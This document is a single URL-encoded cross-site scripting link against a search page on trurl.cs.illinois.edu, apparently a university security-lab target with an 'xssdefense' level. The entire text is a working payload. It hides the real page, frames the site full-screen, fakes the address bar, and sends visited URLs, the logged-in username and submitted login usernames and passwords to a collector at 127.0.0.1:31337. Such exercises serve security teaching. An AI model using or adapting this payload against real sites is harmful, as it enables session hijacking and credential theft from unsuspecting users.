http://trurl.cs.illinois.edu/search?xssdefense=3&q=%3Ciframe%20onload%3D%22payload(%27http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%27)%3Bfunction%20payload(attacker)%20%7Bvar%20first_load%20%3D%200%3Bfunction%20log(attacker%2C%20data)%20%7Bconsole.log(%24.param(data))%3B%24.get(attacker%2C%20data)%3B%7Dfunction%20getPath(url)%20%7Breturn%20url.match(%2F(%5C%2F.*)%2F)%5B1%5D%3B%7Dfunction%20changeAddressBar(url)%20%7Btry%20%7Bwindow.history.replaceState(%7B%7D%2C%20%27%27%2C%20url)%3B%7D%20catch(e)%20%7B%7D%7Dfunction%20proxy(attacker%2C%20mainhref)%20%7B%24(%27body%27).children().hide()%3Bvar%20i%20%3D%20%24(%27%3Ciframe%20id%3D_track%3E%27).css(%7Bposition%3A%20%27absolute%27%2Cwidth%3A%20%27100%25%27%2Cheight%3A%20%27100%25%27%2Ctop%3A%200%2Cleft%3A%200%2Cborder%3A%200%2Cbackground%3A%20%27%23fff%27%7D).attr(%27sandbox%27%2C%20%27allow-same-origin%20allow-forms%27).attr(%27src%27%2C%27http%3A%2F%2Ftrurl.cs.illinois.edu%2F%27).appendTo(%27body%27).load(function()%20%7Bif(first_load%20%3D%3D%200)%20%7BchangeAddressBar(%27http%3A%2F%2Ftrurl.cs.illinois.edu%2F%27)%3Blog(attacker%2C%20%7Bevent%3A%20%27nav%27%2C%20user%3A%20%24(%27%23_track%27).contents().find(%27%23logged-in-user%27).text()%2Curi%3A%20mainhref%7D)%3Bfirst_load%20%3D%20first_load%2B1%3B%7D%24(%27%23_track%27).contents().find(%27.list-group%27).hide()%3B%24(%27body%27%2Cthis.contentDocument).find(%27a%27).click(function()%20%7Blog(attacker%2C%20%7Bevent%3A%27nav%27%2C%20user%3A%20%24(%27%23_track%27).contents().find(%27%23logged-in-user%27).text()%2Curi%3A%20this.href%7D)%3BchangeAddressBar(this.href)%3B%7D).end().find(%27form%27).submit(function()%20%7Bif(%24(this).attr(%27action%27)%20%3D%3D%20%27.%2Flogin%27)%20%7Bvar%20str%20%3D%20%24(this).serialize()%3Bvar%20str_user%20%3D%20%27%27%3Bvar%20eq_index%20%3D%20str.indexOf(%27%3D%27)%3Bvar%20and_index%20%3D%20str.indexOf(%27%26%27)%3Bstr_user%20%3D%20str.substring(eq_index%20%2B%201%2C%20and_index)%3Bvar%20str_pass%20%3D%20%27%27%3Bvar%20eq_index2%20%3D%20str.lastIndexOf(%27%3D%27)%3Bstr_pass%20%3D%20str.substring(eq_index2%20%2B%201%2C%20str.length)%3Blog(attacker%2C%20%7Bevent%3A%20%27login%27%2C%20user%3A%20str_user%2C%20pass%3A%20str_pass%7D)%3B%7Delse%20if(%24(this).attr(%27action%27)%20%3D%3D%20%27.%2Flogout%27)%7Blog(attacker%2C%20%7Bevent%3A%20%27logout%27%2C%20user%3A%20%24(%27%23_track%27).contents().find(%27%23logged-in-user%27).text()%7D)%7Delse%20%7Bvar%20str_uri%20%3D%20%27http%3A%2F%2Ftrurl.cs.illinois.edu%2Fsearch%3F%27%20%2B%20%27q%3D%27%20%2B%20%24(%27%23_track%27).contents().find(%27%23query%27).val()%3BchangeAddressBar(str_uri)%3Blog(attacker%2C%20%7Bevent%3A%27nav%27%2C%20user%3A%20%24(%27%23_track%27).contents().find(%27%23logged-in-user%27).text()%2Curi%3A%20str_uri%20%7D)%7D%7D).end()%3B%7D)%3B%7Dproxy(attacker%2C%20%27http%3A%2F%2Ftrurl.cs.illinois.edu%2F%27)%3B%7D%22%3E